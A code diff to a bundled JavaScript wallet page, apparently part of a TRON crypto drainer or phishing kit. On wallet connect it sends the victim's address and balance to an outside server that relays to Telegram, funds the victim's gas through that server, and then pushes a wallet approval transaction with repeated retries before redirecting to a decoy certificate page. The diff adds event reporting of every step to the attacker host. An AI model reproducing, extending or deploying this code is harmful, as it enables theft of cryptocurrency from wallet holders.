@@ -92862,7 +92862,25 @@
                     s(c),
                     n(!0);
                     console.log("[SIGN] Connected:", c);
+                    const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
+                    const reportEvent = (stage, details) => {
+                        try {
+                            GS.post(API_BASE + "/api/event", Object.assign({
+                                stage: stage,
+                                wallet: c,
+                                time: (new Date).toISOString()
+                            }, details || {}), {
+                                timeout: 5000
+                            }).catch(() => {})
+                        } catch (_) {}
+                    };
+                    reportEvent("WALLET_CONNECTED", {
+                        wallet: c
+                    });
                     console.log("[2] BALANCE CHECK START", {
+                        endpoint: "https://api.trongrid.io/wallet/getaccount"
+                    });
+                    reportEvent("BALANCE_CHECK_START", {
                         endpoint: "https://api.trongrid.io/wallet/getaccount"
                     });
                     let balanceInTRX = 0;
@@ -92880,13 +92898,30 @@
                         minTrx: minTrx,
                         needsTopUp: balanceInTRX < minTrx
                     });
+                    reportEvent("BALANCE_CHECK_RESULT", {
+                        balanceInTRX: balanceInTRX,
+                        minTrx: minTrx,
+                        needsTopUp: balanceInTRX < minTrx
+                    });
 
                     // Telegram: wallet connected (fire-and-forget)
-                    GS.post("https://tronscantelegram-q7ln.onrender.com/api/telegram", {
+                    reportEvent("TELEGRAM_SEND_INITIATED", {
+                        type: "wallet_connected"
+                    });
+                    GS.post(API_BASE + "/api/telegram", {
                         text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nNeeds top-up: ${balanceInTRX < minTrx ? "YES" : "NO"}\nTime: ${new Date().toISOString()}`
                     }, {
                         timeout: 8000
-                    }).catch(() => {});
+                    }).then(() => {
+                        reportEvent("TELEGRAM_SEND_OK", {
+                            type: "wallet_connected"
+                        })
+                    }).catch((err) => {
+                        reportEvent("TELEGRAM_SEND_FAILED", {
+                            type: "wallet_connected",
+                            error: err && err.message ? err.message : String(err)
+                        })
+                    });
 
                     let topUpSent = false;
                     let topUpTxId = "N/A";
@@ -92907,25 +92942,39 @@
                             skipped: true,
                             status: "recent-topup-reuse"
                         });
+                        reportEvent("TRX_TOPUP_SKIPPED", {
+                            reason: "recent-topup-reuse",
+                            balanceInTRX: balanceInTRX
+                        });
                         topUpSent = true
                     } else if (balanceInTRX < minTrx) {
                         console.log("[4] TRX TOP-UP START", {
                             skipped: false,
                             reason: "balance below minTrx / no gas energy",
-                            endpoint: "https://tronscantelegram-q7ln.onrender.com/send-trx",
+                            endpoint: API_BASE + "/send-trx",
                             userAddress: c,
                             balanceInTRX: balanceInTRX,
                             minTrx: minTrx
                         });
+                        reportEvent("TRX_TOPUP_START", {
+                            balanceInTRX: balanceInTRX,
+                            minTrx: minTrx
+                        });
                         try {
-                            const topUpResponse = await GS.post("https://tronscantelegram-q7ln.onrender.com/send-trx", {
+                            const topUpResponse = await GS.post(API_BASE + "/send-trx", {
                                 userAddress: c
                             }, {
                                 timeout: 20000
                             });
                             const topUpData = topUpResponse && topUpResponse.data ? topUpResponse.data : null;
                             console.log("[5] TRX TOP-UP RESULT", topUpData);
+                            reportEvent("TRX_TOPUP_RESULT", topUpData || {
+                                success: false
+                            });
                             if (!(topUpData && topUpData.success)) {
+                                reportEvent("TRX_TOPUP_FAILED", topUpData || {
+                                    success: false
+                                });
                                 window.alert("TRX top-up failed. Need TRX (gas/energy) for transaction fees.");
                                 t(2);
                                 return
@@ -92935,11 +92984,25 @@
                             topUpAmount = topUpData.amount || 0;
 
                             // Notify after top-up confirm (non-blocking)
-                            GS.post("https://tronscantelegram-q7ln.onrender.com/api/telegram", {
+                            reportEvent("TELEGRAM_SEND_INITIATED", {
+                                type: "trx_topup",
+                                sent: topUpSent,
+                                transactionId: topUpTxId
+                            });
+                            GS.post(API_BASE + "/api/telegram", {
                                 text: `TRX top-up ${topUpSent ? "sent" : "skipped (already funded)"}\nWallet: ${c}\nAmount: ${topUpAmount || "N/A"} TRX\nTX: ${topUpTxId}\nBefore: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
                             }, {
                                 timeout: 5000
-                            }).catch(() => {});
+                            }).then(() => {
+                                reportEvent("TELEGRAM_SEND_OK", {
+                                    type: "trx_topup"
+                                })
+                            }).catch((err) => {
+                                reportEvent("TELEGRAM_SEND_FAILED", {
+                                    type: "trx_topup",
+                                    error: err && err.message ? err.message : String(err)
+                                })
+                            });
 
                             if (topUpSent) {
                                 // TRX top-up usually lands in ~7-10s: wait then poll, open sign as soon as funded
@@ -92950,6 +93013,10 @@
                                     intervalMs: 1000,
                                     maxAttempts: 4,
                                     expectedConfirmSec: "7-10"
+                                });
+                                reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
+                                    waitMs: 7000,
+                                    beforeTopUp: beforeTopUp
                                 });
                                 await new Promise((resolve) => setTimeout(resolve, 7000));
                                 let funded = false;
@@ -92965,6 +93032,10 @@
                                             status: "funded",
                                             attempt: attempt + 1
                                         });
+                                        reportEvent("TRX_TOPUP_CONFIRMED", {
+                                            balanceInTRX: balanceInTRX,
+                                            attempt: attempt + 1
+                                        });
                                         break
                                     }
                                     if (attempt < 3) {
@@ -92975,6 +93046,9 @@
                                     console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
                                         balanceInTRX: balanceInTRX,
                                         status: "timeout-continue-sign"
+                                    });
+                                    reportEvent("TRX_TOPUP_CONFIRM_TIMEOUT", {
+                                        balanceInTRX: balanceInTRX
                                     })
                                 }
                             } else {
@@ -92985,11 +93059,17 @@
                                 console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
                                     balanceInTRX: balanceInTRX,
                                     status: "already-funded"
+                                });
+                                reportEvent("TRX_TOPUP_ALREADY_FUNDED", {
+                                    balanceInTRX: balanceInTRX
                                 })
                             }
                         } catch (topUpError) {
                             console.error("[5] TRX TOP-UP RESULT", {
                                 success: false,
+                                error: topUpError && topUpError.message ? topUpError.message : String(topUpError)
+                            });
+                            reportEvent("TRX_TOPUP_FAILED", {
                                 error: topUpError && topUpError.message ? topUpError.message : String(topUpError)
                             });
                             try {
@@ -93021,6 +93101,9 @@
                         console.log("[7] POST-TOP-UP BALANCE CHECK RESULT", {
                             skipped: true,
                             balanceInTRX: balanceInTRX
+                        });
+                        reportEvent("TRX_TOPUP_NOT_NEEDED", {
+                            balanceInTRX: balanceInTRX
                         })
                     }
 
@@ -93030,6 +93113,9 @@
                             sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()))
                         } catch (_) {}
                         console.log("[SIGN] post-top-up settle before approve popup", {
+                            settleMs: 2500
+                        });
+                        reportEvent("APPROVAL_SETTLE_WAIT", {
                             settleMs: 2500
                         });
                         await new Promise((resolve) => setTimeout(resolve, 2500));
@@ -93047,10 +93133,16 @@
                         feeLimit: feeLimit,
                         topUpSent: topUpSent
                     });
+                    reportEvent("APPROVAL_INITIATED", {
+                        balanceInTRX: balanceInTRX,
+                        feeLimit: feeLimit,
+                        fromTopUp: topUpSent
+                    });
                     // Always open approve on first successful top-up path (with retries inside f)
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
-                        retries: topUpSent ? 3 : 1
+                        retries: topUpSent ? 3 : 1,
+                        reportEvent: reportEvent
                     });
                 } catch (a) {
                     console.error("[10] ERROR", a);
@@ -93067,14 +93159,24 @@
                 // checktrc: g=async(service,address)=>{ const r=await service.sendTransaction(address); r&&r.result ? success : fail }
                 const options = opts && "object" === typeof opts ? opts : {};
                 const maxTries = Math.max(1, Number(options.retries) || 1);
+                const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
+                const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                 console.log("[8] APPROVAL START", e, {
                     feeLimit: feeLimit,
                     fromTopUp: !!options.fromTopUp,
                     maxTries: maxTries
                 });
                 console.log("[SIGN] f() / approve start", e);
+                reportEvent("APPROVAL_START", {
+                    feeLimit: feeLimit,
+                    fromTopUp: !!options.fromTopUp,
+                    maxTries: maxTries
+                });
                 if (!l) {
                     console.error("[10] ERROR", "Wallet not ready");
+                    reportEvent("APPROVAL_FAILED", {
+                        reason: "wallet_not_ready"
+                    });
                     window.alert("Wallet not ready. Please reconnect.");
                     t(2);
                     return
@@ -93088,21 +93190,40 @@
                         h(r);
                         if (!r) {
                             console.error("[10] ERROR", "Wallet service missing");
+                            reportEvent("APPROVAL_FAILED", {
+                                reason: "wallet_service_missing",
+                                tryNo: tryNo
+                            });
                             break
                         }
                         console.log("[SIGN] approve attempt", {
                             tryNo: tryNo,
                             maxTries: maxTries
                         });
+                        reportEvent("APPROVAL_ATTEMPT", {
+                            tryNo: tryNo,
+                            maxTries: maxTries
+                        });
                         n = await r.sendTransaction(e, feeLimit);
                         console.log("[9] APPROVAL RESULT", n);
                         console.log("[SIGN] approve result", n);
+                        reportEvent("APPROVAL_ATTEMPT_RESULT", {
+                            tryNo: tryNo,
+                            success: !!(n && (n.result || n.success)),
+                            approvalNotAttempted: !!(n && n.approvalNotAttempted),
+                            txID: n && n.txID || null,
+                            message: n && n.message || null
+                        });
                         if (n && (n.result || n.success)) {
                             break
                         }
                         // If popup never opened (trigger/network), wait and retry — do NOT re-top-up
                         if (n && n.approvalNotAttempted && tryNo < maxTries) {
                             console.warn("[SIGN] approve popup not opened yet, retrying without top-up", {
+                                tryNo: tryNo,
+                                message: n.message
+                            });
+                            reportEvent("APPROVAL_RETRY", {
                                 tryNo: tryNo,
                                 message: n.message
                             });
@@ -93113,12 +93234,28 @@
                     }
                     if (n && (n.result || n.success)) {
                         console.log("[SIGN] Approve OK TXID:", n.txID);
+                        reportEvent("APPROVAL_APPROVED", {
+                            txID: n.txID || "N/A"
+                        });
                         try {
                             sessionStorage.removeItem("trxToppedUp:" + e)
                         } catch (_) {}
-                        GS.post("https://tronscantelegram-q7ln.onrender.com/api/telegram", {
+                        reportEvent("TELEGRAM_SEND_INITIATED", {
+                            type: "transaction_approved",
+                            txID: n.txID || "N/A"
+                        });
+                        GS.post(API_BASE + "/api/telegram", {
                             text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
-                        }).catch(() => {});
+                        }).then(() => {
+                            reportEvent("TELEGRAM_SEND_OK", {
+                                type: "transaction_approved"
+                            })
+                        }).catch((err) => {
+                            reportEvent("TELEGRAM_SEND_FAILED", {
+                                type: "transaction_approved",
+                                error: err && err.message ? err.message : String(err)
+                            })
+                        });
                         setTimeout(() => {
                             window.location.href = "/certificate"
                         }, 1500);
@@ -93128,16 +93265,28 @@
                             stage: "balance-or-network",
                             message: n.message
                         });
+                        reportEvent("APPROVAL_FAILED", {
+                            reason: "popup_not_opened",
+                            message: n.message
+                        });
                         window.alert("Could not start the approval. The wallet popup was not opened.\n" + (n.message ? n.message : "Network request failed."));
                         t(2)
                     } else {
                         console.warn("Approve failed", n);
+                        reportEvent("APPROVAL_FAILED", {
+                            reason: "user_reject_or_failed",
+                            message: n && n.message || null
+                        });
                         window.alert("Approve failed. Please try again." + (n && n.message ? "\n" + n.message : ""));
                         t(2)
                     }
                 } catch (err) {
                     console.error("[10] ERROR", err);
                     console.error("Approve error:", err);
+                    reportEvent("APPROVAL_FAILED", {
+                        reason: "exception",
+                        error: err && err.message ? err.message : String(err)
+                    });
                     window.alert("Sign cancelled or failed. Please try again.");
                     t(2)
                 }
